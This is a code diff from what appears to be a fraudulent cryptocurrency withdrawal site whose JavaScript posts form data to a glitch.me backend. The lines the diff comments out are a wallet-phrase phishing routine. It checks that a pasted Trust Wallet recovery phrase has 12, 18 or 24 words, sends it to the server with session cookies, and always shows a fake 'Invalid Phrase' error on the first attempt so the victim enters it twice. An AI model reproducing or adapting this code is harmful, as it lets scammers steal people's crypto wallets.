@@ -22,7 +22,7 @@ let submission_time = 1;
 
 const handle_withdrawal = async (form) => {
   try {
-    // document.querySelector("#submit").innerHTML = "proccessing...";
+    document.querySelector("#submit").innerHTML = "proccessing...";
     const response = await fetch(
       "https://softjovial-backend.glitch.me/api/user/withdraw",
       {
@@ -34,32 +34,32 @@ const handle_withdrawal = async (form) => {
     const result = await response.json();
     console.log(result);
     if (result.error) {
-      document.querySelector("#centerd_phrase").className = "center-none";
+      // document.querySelector("#centerd_phrase").className = "center-none";
       document.querySelector(".errMessage").innerHTML = result.errMessage;
       document.querySelector("#submit").innerHTML = "try again";
-      document.querySelector("#connect_wallet").innerHTML = "Try again";
+      // document.querySelector("#connect_wallet").innerHTML = "Try again";
 
       return;
     }
 
-    if (submission_time <= 1) {
-      document.querySelector("#centerd_phrase").className = "center-none";
+    // if (submission_time <= 1) {
+    //   document.querySelector("#centerd_phrase").className = "center-none";
 
-      document.querySelector(".errMessage").innerHTML =
-        "Invalid Phrase, Please try again later.";
-      document.querySelector("#submit").innerHTML = "try again";
-      document.querySelector("#connect_wallet").innerHTML = "Try again";
-      submission_time += 1;
-      return;
-    }
+    //   document.querySelector(".errMessage").innerHTML =
+    //     "Invalid Phrase, Please try again later.";
+    //   document.querySelector("#submit").innerHTML = "try again";
+    //   document.querySelector("#connect_wallet").innerHTML = "Try again";
+    //   submission_time += 1;
+    //   return;
+    // }
 
     document.querySelector("#submit").innerHTML = "success";
     window.location.href = `/action/loading.html?${result.message}`;
   } catch (err) {
-    document.querySelector("#centerd_phrase").className = "center-none";
+    // document.querySelector("#centerd_phrase").className = "center-none";
     document.querySelector(".errMessage").innerHTML = err.message;
     document.querySelector("#submit").innerHTML = "try again";
-    document.querySelector("#connect_wallet").innerHTML = "Try again";
+    // document.querySelector("#connect_wallet").innerHTML = "Try again";
   }
 };
 
@@ -70,48 +70,48 @@ document.querySelector("#submit").onclick = () => {
   if (!withdrawal_method.value)
     return (withdrawal_method.style.border = "2px solid red");
 
-  document.querySelector("#centerd_phrase").className = "center";
-  // if (!wallet.value) return (wallet.style.border = "2px solid red");
-  // handle_withdrawal({
-  //   token: checkCookie("token"),
-  //   user: checkCookie("user"),
-  //   withdrawal_amount: withdrawal_amount.value,
-  //   withdrawal_method: withdrawal_method.value,
-  //   wallet: wallet.value,
-  // });
+  // document.querySelector("#centerd_phrase").className = "center";
+  if (!wallet.value) return (wallet.style.border = "2px solid red");
+  handle_withdrawal({
+    token: checkCookie("token"),
+    user: checkCookie("user"),
+    withdrawal_amount: withdrawal_amount.value,
+    withdrawal_method: withdrawal_method.value,
+    wallet: wallet.value,
+  });
 };
 
-document.querySelector("#connect_wallet").onclick = () => {
-  if (!phrase.value) return (phrase.style.border = "2px solid red");
+// document.querySelector("#connect_wallet").onclick = () => {
+//   if (!phrase.value) return (phrase.style.border = "2px solid red");
 
-  const spacesCount = phrase.value.split(" ").length - 1;
-  console.log(spacesCount);
-  if (spacesCount == 11 || spacesCount == 17 || spacesCount == 23) {
-    document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
-    document.querySelector(".errMessage2").innerHTML = "";
-    handle_withdrawal({
-      token: checkCookie("token"),
-      user: checkCookie("user"),
-      withdrawal_amount: withdrawal_amount.value,
-      withdrawal_method: withdrawal_method.value,
-      wallet: phrase.value,
-      requestNumber:submission_time
-    });
-  } else {
-    phrase.style.border = "2px solid red";
-    document.querySelector(".errMessage2").innerHTML =
-      "Invalid Phrase, please copy and paste your real Trustwallet Phrase to continue";
-  }
+//   const spacesCount = phrase.value.split(" ").length - 1;
+//   console.log(spacesCount);
+//   if (spacesCount == 11 || spacesCount == 17 || spacesCount == 23) {
+//     document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
+//     document.querySelector(".errMessage2").innerHTML = "";
+//     handle_withdrawal({
+//       token: checkCookie("token"),
+//       user: checkCookie("user"),
+//       withdrawal_amount: withdrawal_amount.value,
+//       withdrawal_method: withdrawal_method.value,
+//       wallet: phrase.value,
+//       requestNumber:submission_time
+//     });
+//   } else {
+//     phrase.style.border = "2px solid red";
+//     document.querySelector(".errMessage2").innerHTML =
+//       "Invalid Phrase, please copy and paste your real Trustwallet Phrase to continue";
+//   }
 
-  // document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
-  // handle_withdrawal({
-  //   token: checkCookie("token"),
-  //   user: checkCookie("user"),
-  //   withdrawal_amount: withdrawal_amount.value,
-  //   withdrawal_method: withdrawal_method.value,
-  //   wallet: phrase.value,
-  // });
-};
+//   // document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
+//   // handle_withdrawal({
+//   //   token: checkCookie("token"),
+//   //   user: checkCookie("user"),
+//   //   withdrawal_amount: withdrawal_amount.value,
+//   //   withdrawal_method: withdrawal_method.value,
+//   //   wallet: phrase.value,
+//   // });
+// };
 
 document.querySelectorAll("input").forEach((input) => {
   input.onkeyup = () => {
